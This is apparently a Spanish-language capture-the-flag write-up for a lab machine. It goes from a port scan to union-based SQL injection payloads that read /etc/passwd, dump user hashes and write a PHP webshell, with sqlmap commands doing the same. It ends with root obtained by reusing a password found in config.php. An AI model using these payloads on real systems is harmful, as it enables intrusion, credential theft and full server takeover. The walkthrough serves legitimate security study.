PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy

-Entramos al puerto 80 y vemos un input para poner tu nombre de usuario y un combobox para elegir un pais. Se puede tratar de un SQLI

## SQL Injection (SQLI)

### Manual

-Interceptamos la Petición en **'Join Now'**, ponemos una Comilla Simple en el campo **'country'** y le damos a **'Forward'**, después quitamos el **'Intercept is on'** y volvemos a la web:
	-**Fatal error**: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in **/var/www/html/account.php** on line **33** 
	(Hemos conseguido que nos salga un **Error de mysql!!**)

-Con el siguiente Patrón no da error , será el que utilicemos:
	-username=Test&country='--+-

-Averiguamos el Número de Columnas:
	-Con 1 columna no da error, con más si que da:
		-username=Test&country='+union+select+1--+-
		(El Número de Columnas que se está usando es '1')

-Comprobamos que funciona:
	-username=Test&country='+union+select+@@version--+-
		10.5.11-MariaDB-1
		**(FUNCIONA!!)**

-Probamos a listar el /etc/passwd:
	-username=Test&country='+union+select+load_file("/etc/passwd")--+-
		-FUNCIONA!! , vemos el /etc/passwd

-Listamos las Bases de Datos existentes:
username=Test&country='+union+select+schema_name+from+information_schema.schemata--+-
	- information_schema
	- performance_schema
	- mysql
	- registration

-Listamos las Tablas de la BD 'registration':
username=Test&country='+union+select+GROUP_CONCAT(table_name)+from+information_schema.tables+where+table_schema%3d'registration'--+- 
	-registration
	(Solo hay 1 tabla, con el mismo nombre que la BD 'registration')

-Listamos la Columnas de la Tabla username=Test&country='+union+select+GROUP_CONCAT(column_name)from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3d'registration'--+-
	username,userhash,country,regtime

-Listamos las Columnas de 'username' y 'userhash', concatenándolas en las misma columna, ya que solo podemos mostrar una columna:

username=Test&country='+union+select+GROUP_CONCAT(username,0x3a,userhash)+from+registration.registration--+-
	test:098f6bcd4621d373cade4e832627b4f6
	Pruebaaa:32444c3dc47a3b9a7eb0823bccc63013
	(Salen usuarios que hemos puesto nosotros al hacer las pruebas)

-Rompemos los hashes pero no nos sirven para autenticarnos por SSH.


### SQLMAP

Lo testeamos con Sqlmap:
	-sqlmap -u http://10.10.11.116/ --dbs --batch --forms
		[*] `registration`
		[*] information_schema
		[*] mysql
		[*] performance_schema

-Sacamos toda la información de la BD 'registration':
	--sqlmap -u http://10.10.11.116/ -D --dump --batch --forms
		-Sqlmap nos hace un 'SQLI Time Based', que nos saca los usuarios y sus hashes, pero no nos sirve en este caso

## SQLI to RCE

### Manual

-Comprobamos el usuario que tenemos 
	-username=Test&country=' union select user()-- -
		uhc@localhost

-Comprobamos que usuarios tienen permisos de Escritura:
	-username=Test&country=' union select user from mysql.user where File_priv = 'Y'-- -
		- root
		- mysql
		- uhc (Es nuestro Usuario!!!)

-Inyectamos una webshell en el siguiente archivo con 'into outfile':
	![[Pasted image 20250522134904.png]]

-Nos vamos a la siguiente ruta y ejecutamos comandos a través de la webshell:
	-http://10.10.11.116/webshell2.php?cmd=id
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

### SQLMAP

-Para saber el usuario actual:
	-sqlmap -u http://10.10.11.116/ --cookie="user=0cc175b9c0f1b6a831c399e269772661" **--current-user** --forms --batch

-Para saber los privilegios de los usuarios del sistema:
	-sqlmap -u http://10.10.11.116/ --cookie="user=0cc175b9c0f1b6a831c399e269772661" --privilege --forms --batch

-Con el siguiente comando, subimos una webshell con SQLMAP:
	-sqlmap -u http://10.10.11.116/ --cookie="user=0cc175b9c0f1b6a831c399e269772661" --file-write=shell.php --file-dest=/var/www/html/shell.php --forms --batch

-Ejecutamos comandos desde la URL:
	-http://10.10.11.116/shell.php?cmd=id
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

## Escalada de Privilegios

-Nos vamos a la siguiente ruta:
	-/var/www/html/config.php
		 $username = "uhc";
		  $password = "uhc-9qual-global-pw";

-Probamos la contraseña con el usuario root:
	-su root
	-Password: uhc-9qual-global-pw
		root@validation:/# whoami
			root